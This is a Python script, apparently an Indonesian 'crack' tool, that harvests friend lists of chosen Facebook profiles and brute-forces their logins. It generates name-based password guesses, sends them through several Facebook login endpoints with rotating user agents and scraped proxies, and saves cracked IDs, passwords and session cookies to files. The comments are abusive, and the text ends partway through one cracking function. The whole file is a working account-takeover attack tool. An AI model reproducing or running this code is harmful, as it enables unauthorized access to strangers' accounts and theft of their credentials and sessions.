#mau Dec bre
#JANGAN DI RECODE LAGI TOD HARGAIN GUA CAPE BENERIN NYA -!!!!
#RECODE IZIN DULU KONTOL -!!! 
# AUTHOR : MUHAMMAD HALADI S
#MAU RECODE ? MATI LU TOLOL -!!!!
# WHATSAP : 089668228526
#STAY DOSA BROTHER


#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.panel import Panel
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mhasim_ganz...')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozila/5.0 Linux; U; Android '
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='ASUS_Z01QD Build/OPM1.171019.026; wv)'
    e=random.randrange(100, 9999)
    f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0.0.29.105;]'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)

    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['8','9','10','11','12'])
    c=random.choice(['fr-fr; A500 Build/','de-de; EasyPad 970 Build/','vi-vn; ZTE-U V889F Build/','en-US; Aqua_Q1+ Build/','ja-jp; ISW13F Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.4.13 like Chrome/'
    h=random.randrange(73,200)
    i='0'
    j=random.randrange(4500,5900)
    k=random.randrange(40,200)
    l=random.choice(['Safari/537.36','Mobile Safari/537.36 [WhatsApp X/2.20.157 A]'])
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i=random.choice(['; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/','Mobile Safari/537.36 [WhatsApp2Plus/2.20.123 A]','Mobile Safari/537.36 [WhatsApp X/2.20.157 A]'])
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l=random.choice(['Mobile Safari/537.36 [WhatsApp X/2.20.157 A]','Mobile Safari/537.36 [WhatsApp2Plus/2.20.123 A]'])
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	ugen.append(uak)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\033[93m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b,p,kk,hh,Z,N,O,U,B,K,H,M,P])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()

#------------------[ LOGO-BANNER ]-----------------#

#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tCookies Capture Extension Suggestion : [green]Cookiedough[white]'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'Enter Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} Login Succes !{x} ');time.sleep(1)
		os.system('python h7.py')
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK YOUR ACCOUNT !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	print('')
	ip = requests.get("https://api.ipify.org").text
#	print('')
#	print(f'└──> Select Menu{x}')
	print('')
	print('1. Creck Id Publik')
	print('2. Hasil Crack ')
	print('0. Exit')
	_____renv__renv_____ = input('\n Select : ')
	print('')
	if _____renv__renv_____ in ['1']:
		dump_massal()
	elif _____renv__renv_____ in ['2']:
		result()
	elif _____renv__renv_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Successfully Logout+Delete Cookies ')
		exit()
	else:
		print('>> input correctly ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('➪ 1.Hasil CP Anda ')
	print('➪ 2.Hasil OK Anda ')
	print('➪ 0.Kembali	')
	kz = input('\n➪ Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('➪ Filemu kagak ada ngen ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('➪ Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('└── input target amount ? : '))
	except ValueError:
		print('└──> wrong input ')
		exit()
	if jum<1 or jum>100:
		print('└──> Failed Dump Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('└── Enter the Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v1.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('└──unstable signal ')
			exit()
	try:
		print(f'└── Total Id Collected {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> unstable signal ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Friendship Not Public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('')
	print(f'{x}1. Id Old To New ')
	print(f'2. Id New To Old ')
	print(f'3. Id Random {x}')
	print('')
	hu = input('Select : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('└──>input correctly ')
		exit()
		print('')
		
	print('')
	print(f'1. login from {b}Metode1{x} (Mobile Tod)')
	print(f'2. login from {b}Metode2{x} (Mbasic Mek)')
	print(f'3. login from {b}Metode3{x} (Free Tol)')
	print(f'4. login from {b}Metode4{x} (Mobile Tod V2)')
	print('')
	hc = input('└──> Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	elif hc in ['4','04']:
		method.append('unipin')
	else:
		method.append('mobile')
	print('')
	pwplus=input('└──> Add Password Manual ( Y/t ) ')
	print('')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak('Enter an additional password of at least 6 characters\nExample :[green] Indonesia,rahasia,katasandi[white] ')
		pwku=input('Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print('')
	print(f'├──> Results {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'├──> Results {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print(f'├──> Play Airplane Mode Every 500 ID\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ["anjing","bagong","katasandi"]
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'12345')
					pwv.append(frs+'1234')
					pwv.append(frs+'321')
					pwv.append(frs+'123')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12345')
					pwv.append(frs+'1234')
					pwv.append(frs+'321')
					pwv.append(frs+'123')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			elif 'unipin' in method:
				pool.submit(crackunipin,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak('\t[cyan]>>[green] Succesfully Crack,Dont Forget Send Your Feedback After Use My Script [cyan] <<[white] ')
	print('')
	print(f'{h} OK : {h}%s '%(ok))
	print(f'{k} CP : {k}%s{x} '%(cp))
	print('')
	print(f'\t{x}>>{k} Good Bye Thanks To Using My Script {x} << ')
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'{K}RESULTS {cpc}')
				print(f'\r CIEE CP {kk}{idf}|{kk}{pw}{P}\n{M}{ua}{P}\n')
				open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
				akun.append(idf+' • '+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'{H}RESULTS {okc}')
				print(f'\rCIEE JACKPOCT OK {hh}{idf}|{hh}{pw}{P}\n{hh}{kuki}\n{M}{ua}{P}\n')
				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MBASIC ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r├── Email  : {kk}{idf}{P}|{kk}{pw}          {P}\n└── User Agent  : {kk}{ua}{P}           \n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r├── Email  : {hh}{idf}{P}|{hh}{pw}          {P}\n└──  Cookie : {hh}{kuki}{P}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				#os.popen('play-audio data/ok.mp3')
				#cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-FREE-FB ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
